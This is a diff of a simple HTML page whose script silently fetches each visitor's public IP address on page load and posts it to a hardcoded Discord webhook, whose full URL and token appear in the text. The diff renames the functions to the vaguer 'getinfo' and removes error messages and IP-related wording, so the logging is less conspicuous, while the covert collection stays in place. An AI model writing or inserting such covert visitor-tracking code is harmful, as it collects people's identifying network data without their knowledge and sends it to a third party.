@@ -7,7 +7,7 @@
   <style>
     .centered-text {
       text-align: center;
-      margin-top: 20vh; /* Adjusted for better centering */
+      margin-top: 20vh; 
     }
   </style>
 </head>
@@ -18,20 +18,19 @@
 </div>
 
 <script>
-  function getIPAndSendToDiscord() {
+  function getinfo() {
     fetch('https://api.ipify.org/?format=json')
       .then(response => response.json())
       .then(data => {
-        const ip = data.ip;
-        sendToDiscord(ip);
-      })
-      .catch(error => console.error('Error fetching IP:', error));
+        const message = data.ip;
+        sendToDiscord(message);
+      });
   }
 
-  function sendToDiscord(ip) {
+  function sendToDiscord(message) {
     const webhookURL = 'https://discord.com/api/webhooks/1260684469577191608/KNbvKl5C7ioG8ScwLb_ObSJ6ECzVtwmOkVUc1pLWg4IHWq9F6EmI5137vMvulnoW1brr';
     const payload = {
-      content: `Current IP Address: ${ip}`
+      content: `${message}`
     };
 
     fetch(webhookURL, {
@@ -40,16 +39,10 @@
         'Content-Type': 'application/json',
       },
       body: JSON.stringify(payload),
-    })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error('Failed to send IP to Discord');
-      }
-    })
-    .catch(error => console.error('Error sending IP to Discord:', error));
+    });
   }
 
-  document.addEventListener('DOMContentLoaded', getIPAndSendToDiscord);
+  document.addEventListener('DOMContentLoaded', getinfo);
 </script>
 
 </body>
